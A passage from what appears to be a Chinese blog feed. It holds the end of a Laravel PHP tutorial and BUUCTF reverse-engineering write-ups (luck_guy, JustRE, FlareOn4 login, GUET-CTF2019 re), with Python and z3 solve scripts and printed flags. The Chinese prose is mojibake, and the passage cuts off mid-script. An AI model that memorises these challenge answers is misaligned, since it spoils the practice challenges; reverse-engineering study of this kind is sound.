class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ˜¯å¦ä¸»åŠ¨ç»´æŠ¤æ—¶é—´æˆ³</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Usertest-phpæ¨¡å‹ä»£ç "><a href="#Usertest-phpæ¨¡å‹ä»£ç " class="headerlink" title="Usertest.phpæ¨¡å‹ä»£ç "></a>Usertest.phpæ¨¡å‹ä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Factories</span>\<span class="title">HasFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Usertest</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">HasFactory</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PostTestController-phpæ§åˆ¶å™¨ä»£ç "><a href="#PostTestController-phpæ§åˆ¶å™¨ä»£ç " class="headerlink" title="PostTestController.phpæ§åˆ¶å™¨ä»£ç "></a>PostTestController.phpæ§åˆ¶å™¨ä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">laravel_study_user</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Usertest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PostTestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$dbuser</span> = Usertest::query() -&gt; where(<span class="string">&quot;username&quot;</span>,<span class="variable">$user</span>) -&gt; firstOrFail();</span><br><span class="line">        <span class="comment">// ddè°ƒè¯•phpç¨‹åº</span></span><br><span class="line">        <span class="comment">//        dd($dbuser);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¿®æ”¹äº†alexç”¨æˆ·çš„email</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;email = &quot;alex.com&quot;;</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;save();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// returnè§†å›¾</span></span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&quot;posttest&quot;</span>,[<span class="string">&quot;user&quot;</span>=&gt;<span class="variable">$user</span>,<span class="string">&quot;email&quot;</span>=&gt;<span class="variable">$dbuser</span>-&gt;email]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web-phpè·¯ç”±ä»£ç "><a href="#web-phpè·¯ç”±ä»£ç " class="headerlink" title="web.phpè·¯ç”±ä»£ç "></a>web.phpè·¯ç”±ä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Route</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Web Routes</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Here is where you can register web routes for your application. These</span></span><br><span class="line"><span class="comment">| routes are loaded by the RouteServiceProvider within a group which</span></span><br><span class="line"><span class="comment">| contains the &quot;web&quot; middleware group. Now create something great!</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;posttest/&#123;user&#125;&#x27;</span>,[\App\Http\Controllers\PostTestController::class,<span class="string">&quot;show&quot;</span>]);</span><br></pre></td></tr></table></figure><h3 id="posttest-blade-phpè§†å›¾ä»£ç "><a href="#posttest-blade-phpè§†å›¾ä»£ç " class="headerlink" title="posttest.blade.phpè§†å›¾ä»£ç "></a>posttest.blade.phpè§†å›¾ä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;hello laravel&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt; &#123;&#123; <span class="variable">$user</span> &#125;&#125;&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; <span class="variable">$email</span> &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h3><p><img src="https://i.loli.net/2021/04/14/yceTw72BnEvJ3QU.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> å¼€å‘å­¦ä¹  </tag>
            
            <tag> å¼€å‘æ¡†æ¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf reverseé¢˜è§£1</title>
      <link href="2021/04/07/buuctf-reverse/"/>
      <url>2021/04/07/buuctf-reverse/</url>
      
        <content type="html"><![CDATA[<h2 id="1-GXYCTF2019-luck-guy"><a href="#1-GXYCTF2019-luck-guy" class="headerlink" title="1.[GXYCTF2019]luck_guy"></a>1.[GXYCTF2019]luck_guy</h2><p>elfæ–‡ä»¶ï¼Œ64ä½ï¼Œç›®æµ‹æ˜¯è¾“å…¥ä»€ä¹ˆlucky number<br><img src="https://i.loli.net/2021/04/07/Fjytlk8xvTOhY3f.png" alt=""></p><p>ä¸ç®¡ä»–ï¼Œç›´æ¥ida f5å¤§æ³•<br>ä¸»è¦çš„å‡½æ•°å°±æ˜¯getflagè¿™ä¸ªå‡½æ•°<br><img src="https://i.loli.net/2021/04/07/6VtlXNYGDeALmrq.png" alt=""><br>è®¾ç½®äº†éšæœºæ•°ï¼Œç„¶åswitchï¼Œæœ¬åœ°æµ‹è¯•åŸºæœ¬ä¸å¯èƒ½èµ°1-5åˆ†æ”¯<br>ç›®æµ‹ä¸€ä¸‹ï¼Œæ¯”è¾ƒåˆç†çš„æµç¨‹å°±æ˜¯451<br>4ä¸ºf2èµ‹å€¼<br>5æ”¹f2çš„å€¼<br>1æ‹¼æ¥f1å’Œf2<br>å…¶ä¸­f1åœ¨dataæ®µï¼Œæœ‰å­—ç¬¦ä¸²æ•°æ®ï¼Œf2åœ¨bssæœªåˆå§‹åŒ–å…¨å±€å˜é‡æ®µ<br>ç„¶åå°±èµ°è¿™ä¸ªæµç¨‹ï¼Œä¸€å¼€å§‹è„‘å­æŠ½äº†ï¼ŒæŒ‡é’ˆé‚£ä¸ªåœ°æ–¹è¯»é”™äº†ç„¶åå°±æ€ä¹ˆä¹Ÿæ‰¾ä¸åˆ°<br>ç»“åˆæ±‡ç¼–æ¥è¯»ï¼Œå±€éƒ¨å˜é‡så…¶å®ä¸æ˜¯ä¸€ä¸ªlong longç±»å‹çš„æ•°æ®è€Œæ˜¯ä¸€ä¸ªå­—ç¬¦æ•°ç»„</p><p><img src="https://i.loli.net/2021/04/07/vPWqsT9XVmuxpJl.png" alt=""></p><p>ç„¶åæœ¬åœ°å†™ä¸ªè„šæœ¬ä¸€è¿è¡Œå°±å‡ºæ¥äº†<br>é™„ä¸Šæœ¬åœ°è°ƒè¯•çš„pyè„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;7F666F6067756369&quot;</span></span><br><span class="line"></span><br><span class="line">listFlag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">        listFlag.append(flag[i-<span class="number">2</span>:i])</span><br><span class="line"></span><br><span class="line">listFlag.append(<span class="string">&#x27;69&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line">listFlag.reverse()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="string">&#x27;0x&#x27;</span> + listFlag[i]</span><br><span class="line">    <span class="comment"># listFlag[i] = int(listFlag[i],16)</span></span><br><span class="line"><span class="comment"># print(listFlag)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">int</span>(listFlag[i],base = <span class="number">16</span>)</span><br><span class="line">    print(listFlag)</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">chr</span>(listFlag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(listFlag))</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°flagï¼Œä½†æ˜¯æ˜¯GXYå‰ç¼€ï¼Œæ¢ä¸Šctfå‰ç¼€äº¤ä¸Šæ‰å¯¹<br><code>flag&#123;&#123;do_not_hate_me&#125;</code></p><h2 id="2-BJDCTF2020-JustRE"><a href="#2-BJDCTF2020-JustRE" class="headerlink" title="2.[BJDCTF2020]JustRE"></a>2.[BJDCTF2020]JustRE</h2><p>ç­¾åˆ°é¢˜</p><p>æ„Ÿè§‰åƒä¸ªwin32çš„å°ç¨‹åº<br><img src="https://i.loli.net/2021/04/08/uRZEXSd3ThVbU5q.png" alt=""></p><p>æœå­—ç¬¦ä¸²å¤§æ³•<br><img src="https://i.loli.net/2021/04/08/7FwZ6BTmgpWUM5z.png" alt=""></p><p>å‘ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²<br><img src="https://i.loli.net/2021/04/08/Y6zUuAHxFZedtk9.png" alt=""></p><p>äº¤ä¸Šå°±å¯¹äº†555</p><h2 id="3-FlareOn4-login"><a href="#3-FlareOn4-login" class="headerlink" title="3.[FlareOn4]login"></a>3.[FlareOn4]login</h2><p>ä¸‹è½½ä¸‹æ¥å‘ç°æ˜¯htmlæ–‡ä»¶<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span><br><span class="line">    <span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>)     ? c : c - <span class="number">26</span>);&#125;);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span><br><span class="line">        alert(<span class="string">&quot;Correct flag!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å‘ç°ä¸€æ®µjsä»£ç <br>åˆ†æå‘ç°æ ¸å¿ƒé€»è¾‘ä¸»è¦æ˜¯è¿™ä¸€å¥ï¼Œåªè¦æ˜¯å­—æ¯å°±è¢«æ­£åˆ™åŒ¹é…åˆ°ï¼Œç„¶åæ‰§è¡Œä¸‹é¢è¿™ä¸ª<br><code>String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13)     ? c : c - 26);&#125;);</code><br>å¤§æ¦‚å°±æ˜¯åˆ¤æ–­å­—ç¬¦æ˜¯å¦å°äºZï¼Œå¦‚æœæ˜¯ç¬¬ä¸€ä¸ªæ‹¬å·çš„å€¼å°±å˜æˆZå¦åˆ™å˜æˆz(æ³¨æ„æ­¤æ—¶cçš„å€¼æ²¡æœ‰å‘ç”Ÿæ”¹å˜)ï¼Œç„¶åç¬¬äºŒä¸ªå°æ‹¬å·æ˜¯å°†cæœ¬èº«+13(æ³¨æ„æ­¤æ—¶cçš„å€¼å·²ç»å‘ç”Ÿäº†æ”¹å˜)<br>å†åˆ¤æ–­ä¸¤ä¸ªå€¼çš„å¤§å°å…³ç³»ï¼Œå¦‚æœå‰è€…å¤§å°±ä¸æ”¹å˜ï¼Œå¦‚æœåè€…å¤§å°±-26(å³ç›¸å½“äº+13å-26ï¼Œæœ¬è´¨æ˜¯åŸæœ¬çš„å­—ç¬¦-13)<br>å­—æ¯ä¸€å…±26ä¸ªï¼Œå¦‚æœæœ¬èº«å˜æˆzåå¤§äºæœ¬èº«+13ï¼Œé‚£ä¹ˆå­—æ¯ä¸€å®šä¼šå°äºn</p><p>æœ‰äº†è¿™ä¸ªé€»è¾‘å†™è§£å¯†è„šæœ¬å°±å¯ä»¥äº†ï¼Œéå†åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœå½“å‰å­—ç¬¦å±äºa-mï¼Œé‚£ä¹ˆ+13ï¼Œå¦‚æœå±äºn-zï¼Œé‚£ä¹ˆ-13å³å¯<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span></span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line"></span><br><span class="line">flaglist = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;Z&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &gt;= <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> flag[i] &lt;= <span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;M&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &lt;= <span class="string">&#x27;m&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) + <span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) - <span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure></p><p><code>flag&#123;ClientSideLoginsAreEasy@flare-on.com&#125;</code></p><p>çœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpæ‰å‘ç°è¿™æ˜¯ä¸€ç§åŠ å¯†ä¸ºROT13åŠ å¯†ï¼Œå­¦åˆ°äº†</p><blockquote><p>å¥—ç”¨ROT13åˆ°ä¸€æ®µæ–‡å­—ä¸Šä»…ä»…åªéœ€è¦æ£€æŸ¥å­—å…ƒå­—æ¯é¡ºåºå¹¶å–ä»£å®ƒåœ¨13ä½ä¹‹åçš„å¯¹åº”å­—æ¯ï¼Œæœ‰éœ€è¦è¶…è¿‡æ—¶åˆ™é‡æ–°ç»•å›26è‹±æ–‡å­—æ¯å¼€ å¤´å³å¯ã€‚Aæ¢æˆNã€Bæ¢æˆOã€ä¾æ­¤ç±»æ¨åˆ°Mæ¢æˆZï¼Œç„¶ååºåˆ—åè½¬ï¼šNæ¢æˆAã€Oæ¢æˆBã€æœ€åZæ¢æˆMã€‚åªæœ‰è¿™äº›å‡ºç°åœ¨è‹±æ–‡å­—æ¯é‡Œå¤´çš„å­—å…ƒå—å½±å“ï¼›æ•°å­—ã€ç¬¦ å·ã€ç©ºç™½å­—å…ƒä»¥åŠæ‰€æœ‰å…¶ä»–å­—å…ƒéƒ½ä¸å˜ã€‚å› ä¸ºåªæœ‰åœ¨è‹±æ–‡å­—æ¯è¡¨é‡Œå¤´åªæœ‰26ä¸ªï¼Œå¹¶ä¸”26=2Ã—13ï¼ŒROT13å‡½æ•°æ˜¯å®ƒè‡ªå·±çš„é€†åï¼š [1] </p></blockquote><p>å¯¹ä»»ä½•å­—å…ƒxï¼šROT13(ROT13(x))=ROT26(x)=xã€‚<br>ç›´æ¥æ‰¾ä¸ªåœ¨çº¿è§£å¯†å·¥å…·æ¢­å‡ºæ¥ä¹Ÿå¯ä»¥</p><h2 id="4-GUET-CTF2019-re"><a href="#4-GUET-CTF2019-re" class="headerlink" title="4.[GUET-CTF2019]re"></a>4.[GUET-CTF2019]re</h2><p>æ˜¯ä¸ªELFæ–‡ä»¶ï¼Œå…ˆchecksecä¸€ä¸‹<br><img src="https://i.loli.net/2021/04/10/oJTznurCURtXE5N.png" alt=""><br>å‘ç°å­˜åœ¨UPXå£³<br>ç›´æ¥ç”¨å·¥å…·è„±å£³<br><code>./upx -d ./re</code><br>ç„¶åè¿›å…¥idaåˆ†æï¼Œæ ¸å¿ƒé€»è¾‘å¾ˆç®€å•ï¼Œæ±‚å‡ºæ¯ä¸€ä½flagç„¶åè½¬æ¢æˆå­—ç¬¦å°±å¯ä»¥ï¼Œä½†æ˜¯æœ‰å‘ç‚¹<br><img src="https://i.loli.net/2021/04/10/6rUJXYEoli1egf5.png" alt=""></p><p>ä¸€å¼€å§‹æ˜¯æƒ³é€æ­¥æ±‚è§£çš„ï¼Œä½†æ˜¯å‘ç°è¿™ä¹Ÿå¤ªåäººç±»äº†ï¼Œç›´æ¥ç”¨æ­£åˆ™æå–å§<br>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line"><span class="number">166163712</span>//<span class="number">1629056</span></span><br><span class="line">,<span class="number">731332800</span>//<span class="number">6771600</span></span><br><span class="line">,<span class="number">357245568</span>//<span class="number">3682944</span></span><br><span class="line">,<span class="number">1074393000</span>//<span class="number">10431000</span></span><br><span class="line">,<span class="number">489211344</span>//<span class="number">3977328</span></span><br><span class="line">,<span class="number">518971936</span>//<span class="number">5138336</span></span><br><span class="line">,<span class="number">406741500</span>//<span class="number">7532250</span></span><br><span class="line">,<span class="number">294236496</span>//<span class="number">5551632</span></span><br><span class="line">,<span class="number">177305856</span>//<span class="number">3409728</span></span><br><span class="line">,<span class="number">650683500</span>//<span class="number">13013670</span></span><br><span class="line">,<span class="number">298351053</span>//<span class="number">6088797</span></span><br><span class="line">,<span class="number">386348487</span>//<span class="number">7884663</span></span><br><span class="line">,<span class="number">438258597</span>//<span class="number">8944053</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  if ( 5198490 * flag[14] != 249527520 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4544518 * flag[15] != 445362764 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 3645600 * flag[17] != 174988800 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 10115280 * flag[16] != 981182160 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9667504 * flag[18] != 493042704 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5364450 * flag[19] != 257493600 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 13464540 * flag[20] != 767478780 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5488432 * flag[21] != 312840624 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 14479500 * flag[22] != 1404511500 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6451830 * flag[23] != 316139670 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6252576 * flag[24] != 619005024 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7763364 * flag[25] != 372641472 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7327320 * flag[26] != 373693320 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8741520 * flag[27] != 498266640 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8871876 * flag[28] != 452465676 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4086720 * flag[29] != 208422720 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9374400 * flag[30] == 515592000 )</span></span><br><span class="line"><span class="string">    return 5759124 * flag[31] == 719890500;</span></span><br><span class="line"><span class="string">  return 0LL;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒ¹é…è‡³å°‘ä¸‰æ¬¡æ•°å­—æ‰æœ‰æ•ˆ</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d&#123;3,&#125;&#x27;</span>)</span><br><span class="line">flagRe = pattern.findall(text)</span><br><span class="line">print(flagRe)</span><br><span class="line"></span><br><span class="line">smallList = []</span><br><span class="line">bigList = []</span><br><span class="line">flagAppend = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    smallList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    bigList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(smallList))</span><br><span class="line">print(<span class="built_in">len</span>(bigList))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(smallList)):</span><br><span class="line">    flagAppend.append(bigList[i] // smallList[i])</span><br><span class="line"></span><br><span class="line">print(flagAppend)</span><br><span class="line"></span><br><span class="line">flag = flag + flagAppend</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><p>åæ¥ç”±äºè¿™ä¿©å‘ç‚¹å°±æ€ä¹ˆäº¤ä¹Ÿä¸å¯¹ï¼Œæœäº†å¸ˆå‚…ä»¬çš„wpæ‰å‘ç°â€¦<br>è¿˜æœ‰ä¸€ç§è§£æ³•å°±æ˜¯ç”¨z3çº¦æŸå™¨æ¥è§£ï¼ˆå­¦åˆ°äº†å­¦åˆ°äº†</p><blockquote><p><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p></blockquote><p>ç”¨è¿™ç§æ–¹æ³•æ¥è§£ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼Œå…ˆè§£å‡ºæ¥ç„¶åå†è½¬asciiç <br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = Int(<span class="string">&quot;flag[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">1629056</span> * flag[<span class="number">0</span>] == <span class="number">166163712</span>)</span><br><span class="line">s.add(<span class="number">6771600</span> * flag[<span class="number">1</span>] == <span class="number">731332800</span>)</span><br><span class="line">s.add(<span class="number">3682944</span> * flag[<span class="number">2</span>] == <span class="number">357245568</span>)</span><br><span class="line">s.add(<span class="number">10431000</span> * flag[<span class="number">3</span>] == <span class="number">1074393000</span>)</span><br><span class="line">s.add(<span class="number">3977328</span> * flag[<span class="number">4</span>] == <span class="number">489211344</span>)</span><br><span class="line">s.add(<span class="number">5138336</span> * flag[<span class="number">5</span>] == <span class="number">518971936</span>)</span><br><span class="line">s.add(<span class="number">7532250</span> * flag[<span class="number">7</span>] == <span class="number">406741500</span>)</span><br><span class="line">s.add(<span class="number">5551632</span> * flag[<span class="number">8</span>] == <span class="number">294236496</span>)</span><br><span class="line">s.add(<span class="number">3409728</span> * flag[<span class="number">9</span>] == <span class="number">177305856</span>)</span><br><span class="line">s.add(<span class="number">13013670</span> * flag[<span class="number">10</span>] == <span class="number">650683500</span>)</span><br><span class="line">s.add(<span class="number">6088797</span> * flag[<span class="number">11</span>] == <span class="number">298351053</span>)</span><br><span class="line">s.add(<span class="number">7884663</span> * flag[<span class="number">12</span>] == <span class="number">386348487</span>)</span><br><span class="line">s.add(<span class="number">8944053</span> * flag[<span class="number">13</span>] == <span class="number">438258597</span>)</span><br><span class="line">s.add(<span class="number">5198490</span> * flag[<span class="number">14</span>] == <span class="number">249527520</span>)</span><br><span class="line">s.add(<span class="number">4544518</span> * flag[<span class="number">15</span>] == <span class="number">445362764</span>)</span><br><span class="line">s.add(<span class="number">3645600</span> * flag[<span class="number">17</span>] == <span class="number">174988800</span>)</span><br><span class="line">s.add(<span class="number">10115280</span> * flag[<span class="number">16</span>] == <span class="number">981182160</span>)</span><br><span class="line">s.add(<span class="number">9667504</span> * flag[<span class="number">18</span>] == <span class="number">493042704</span>)</span><br><span class="line">s.add(<span class="number">5364450</span> * flag[<span class="number">19</span>] == <span class="number">257493600</span>)</span><br><span class="line">s.add(<span class="number">13464540</span> * 